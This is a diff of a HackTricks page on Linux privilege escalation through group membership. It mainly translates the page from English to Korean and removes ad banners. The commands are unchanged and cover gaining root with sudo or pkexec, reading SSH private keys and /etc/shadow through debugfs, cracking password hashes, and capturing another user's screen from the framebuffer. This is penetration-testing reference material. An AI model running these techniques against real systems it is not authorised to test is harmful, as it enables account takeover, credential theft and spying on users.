@@ -1,18 +1,11 @@
 {{#include ../../banners/hacktricks-training.md}}
 
-<figure><img src="/images/image (48).png" alt=""><figcaption></figcaption></figure>
-
-Use [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=command-injection) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
-Get Access Today:
-
-{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=command-injection" %}
 
 # Sudo/Admin Groups
 
 ## **PE - Method 1**
 
-**Sometimes**, **by default \(or because some software needs it\)** inside the **/etc/sudoers** file you can find some of these lines:
-
+**때때로**, **기본적으로 \(또는 일부 소프트웨어가 필요하기 때문에\)** **/etc/sudoers** 파일 안에서 다음과 같은 줄을 찾을 수 있습니다:
 ```bash
 # Allow members of group sudo to execute any command
 %sudo	ALL=(ALL:ALL) ALL
@@ -20,48 +13,35 @@ Get Access Today:
 # Allow members of group admin to execute any command
 %admin 	ALL=(ALL:ALL) ALL
 ```
+이것은 **sudo 또는 admin 그룹에 속한 모든 사용자가 sudo로 무엇이든 실행할 수 있음을 의미합니다**.
 
-This means that **any user that belongs to the group sudo or admin can execute anything as sudo**.
-
-If this is the case, to **become root you can just execute**:
-
+이 경우, **root가 되려면 다음을 실행하면 됩니다**:
 ```text
 sudo su
 ```
-
 ## PE - Method 2
 
-Find all suid binaries and check if there is the binary **Pkexec**:
-
+모든 suid 바이너리를 찾아보고 **Pkexec** 바이너리가 있는지 확인하십시오:
 ```bash
 find / -perm -4000 2>/dev/null
 ```
-
-If you find that the binary pkexec is a SUID binary and you belong to sudo or admin, you could probably execute binaries as sudo using pkexec.  
-Check the contents of:
-
+이진 파일 pkexec가 SUID 이진 파일이고 sudo 또는 admin에 속한다면, pkexec를 사용하여 sudo로 이진 파일을 실행할 수 있습니다. 다음 내용을 확인하세요:
 ```bash
 cat /etc/polkit-1/localauthority.conf.d/*
 ```
+여기에서 어떤 그룹이 **pkexec**를 실행할 수 있는지 확인할 수 있으며, 일부 리눅스에서는 기본적으로 **sudo 또는 admin** 그룹이 나타날 수 있습니다.
 
-There you will find which groups are allowed to execute **pkexec** and **by default** in some linux can **appear** some of the groups **sudo or admin**.
-
-To **become root you can execute**:
-
+**루트가 되려면 다음을 실행할 수 있습니다**:
 ```bash
 pkexec "/bin/sh" #You will be prompted for your user password
 ```
-
-If you try to execute **pkexec** and you get this **error**:
-
+**pkexec**를 실행하려고 시도했는데 **오류**가 발생하면:
 ```bash
 polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
 ==== AUTHENTICATION FAILED ===
 Error executing command as another user: Not authorized
 ```
-
-**It's not because you don't have permissions but because you aren't connected without a GUI**. And there is a work around for this issue here: [https://github.com/NixOS/nixpkgs/issues/18012\#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). You need **2 different ssh sessions**:
-
+**권한이 없어서가 아니라 GUI 없이 연결되어 있지 않기 때문입니다**. 이 문제에 대한 해결 방법은 여기에서 확인할 수 있습니다: [https://github.com/NixOS/nixpkgs/issues/18012\#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). **2개의 서로 다른 ssh 세션**이 필요합니다:
 ```bash:session1
 echo $$ #Step1: Get current PID
 pkexec "/bin/bash" #Step 3, execute pkexec
@@ -72,39 +52,31 @@ pkexec "/bin/bash" #Step 3, execute pkexec
 pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
 #Step 4, you will be asked in this session to authenticate to pkexec
 ```
-
 # Wheel Group
 
-**Sometimes**, **by default** inside the **/etc/sudoers** file you can find this line:
-
+**때때로**, **기본적으로** **/etc/sudoers** 파일 안에서 이 줄을 찾을 수 있습니다:
 ```text
 %wheel	ALL=(ALL:ALL) ALL
 ```
+이것은 **wheel 그룹에 속한 모든 사용자가 sudo로 모든 것을 실행할 수 있음을 의미합니다**.
 
-This means that **any user that belongs to the group wheel can execute anything as sudo**.
-
-If this is the case, to **become root you can just execute**:
-
+이 경우, **root가 되려면 다음을 실행하면 됩니다**:
 ```text
 sudo su
 ```
-
 # Shadow Group
 
-Users from the **group shadow** can **read** the **/etc/shadow** file:
-
+**shadow** 그룹의 사용자들은 **/etc/shadow** 파일을 **읽을** 수 있습니다:
 ```text
 -rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
 ```
+그래서 파일을 읽고 **해시를 크랙해보세요**.
 
-So, read the file and try to **crack some hashes**.
+# 디스크 그룹
 
-# Disk Group
+이 권한은 기계 내부의 모든 데이터에 접근할 수 있으므로 거의 **루트 접근과 동등합니다**.
 
-This privilege is almost **equivalent to root access** as you can access all the data inside of the machine.
-
-Files:`/dev/sd[a-z][1-9]`
-
+파일: `/dev/sd[a-z][1-9]`
 ```text
 debugfs /dev/sda1
 debugfs: cd /root
@@ -112,70 +84,54 @@ debugfs: ls
 debugfs: cat /root/.ssh/id_rsa
 debugfs: cat /etc/shadow
 ```
-
-Note that using debugfs you can also **write files**. For example to copy `/tmp/asd1.txt` to `/tmp/asd2.txt` you can do:
-
+debugfs를 사용하면 **파일을 쓸 수** 있다는 점에 유의하세요. 예를 들어 `/tmp/asd1.txt`를 `/tmp/asd2.txt`로 복사하려면 다음과 같이 할 수 있습니다:
 ```bash
 debugfs -w /dev/sda1
 debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
 ```
-
-However, if you try to **write files owned by root** \(like `/etc/shadow` or `/etc/passwd`\) you will have a "**Permission denied**" error.
+그러나 **root가 소유한 파일** \(예: `/etc/shadow` 또는 `/etc/passwd`\)을 **작성하려고** 하면 "**Permission denied**" 오류가 발생합니다.
 
 # Video Group
 
-Using the command `w` you can find **who is logged on the system** and it will show an output like the following one:
-
+`w` 명령어를 사용하면 **시스템에 로그인한 사람**을 찾을 수 있으며, 다음과 같은 출력을 보여줍니다:
 ```bash
 USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
 yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
 moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
 ```
+**tty1**는 사용자 **yossi가 물리적으로** 머신의 터미널에 로그인했음을 의미합니다.
 
-The **tty1** means that the user **yossi is logged physically** to a terminal on the machine.
-
-The **video group** has access to view the screen output. Basically you can observe the the screens. In order to do that you need to **grab the current image on the screen** in raw data and get the resolution that the screen is using. The screen data can be saved in `/dev/fb0` and you could find the resolution of this screen on `/sys/class/graphics/fb0/virtual_size`
-
+**video group**은 화면 출력을 볼 수 있는 권한이 있습니다. 기본적으로 화면을 관찰할 수 있습니다. 그렇게 하려면 **현재 화면의 이미지를** 원시 데이터로 가져오고 화면이 사용하는 해상도를 알아야 합니다. 화면 데이터는 `/dev/fb0`에 저장할 수 있으며, 이 화면의 해상도는 `/sys/class/graphics/fb0/virtual_size`에서 찾을 수 있습니다.
 ```bash
 cat /dev/fb0 > /tmp/screen.raw
 cat /sys/class/graphics/fb0/virtual_size
 ```
-
-To **open** the **raw image** you can use **GIMP**, select the **`screen.raw`** file and select as file type **Raw image data**:
+**원시 이미지**를 **열기** 위해 **GIMP**를 사용하고 **`screen.raw`** 파일을 선택한 후 파일 형식으로 **Raw image data**를 선택할 수 있습니다:
 
 ![](../../images/image%20%28208%29.png)
 
-Then modify the Width and Height to the ones used on the screen and check different Image Types \(and select the one that shows better the screen\):
+그런 다음 너비와 높이를 화면에서 사용된 값으로 수정하고 다양한 이미지 유형을 확인한 후 \(화면을 더 잘 보여주는 유형을 선택\):
 
 ![](../../images/image%20%28295%29.png)
 
-# Root Group
+# 루트 그룹
 
-It looks like by default **members of root group** could have access to **modify** some **service** configuration files or some **libraries** files or **other interesting things** that could be used to escalate privileges...
+기본적으로 **루트 그룹의 구성원**은 **서비스** 구성 파일이나 일부 **라이브러리** 파일 또는 **특히 흥미로운 것들**을 **수정**할 수 있는 접근 권한이 있을 수 있습니다. 이는 권한 상승에 사용될 수 있습니다...
 
-**Check which files root members can modify**:
-
+**루트 구성원이 수정할 수 있는 파일 확인**:
 ```bash
 find / -group root -perm -g=w 2>/dev/null
 ```
+# Docker 그룹
 
-# Docker Group
-
-You can mount the root filesystem of the host machine to an instance’s volume, so when the instance starts it immediately loads a `chroot` into that volume. This effectively gives you root on the machine.
+호스트 머신의 루트 파일 시스템을 인스턴스의 볼륨에 마운트할 수 있으므로, 인스턴스가 시작될 때 즉시 해당 볼륨에 `chroot`를 로드합니다. 이는 사실상 머신에서 루트를 제공하는 것입니다.
 
 {% embed url="https://github.com/KrustyHack/docker-privilege-escalation" %}
 
 {% embed url="https://fosterelli.co/privilege-escalation-via-docker.html" %}
 
-# lxc/lxd Group
+# lxc/lxd 그룹
 
-[lxc - Privilege Escalation](lxd-privilege-escalation.md)
-
-<figure><img src="/images/image (48).png" alt=""><figcaption></figcaption></figure>
-
-Use [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=command-injection) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
-Get Access Today:
-
-{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=command-injection" %}
+[lxc - 권한 상승](lxd-privilege-escalation.md)
 
 {{#include ../../banners/hacktricks-training.md}}
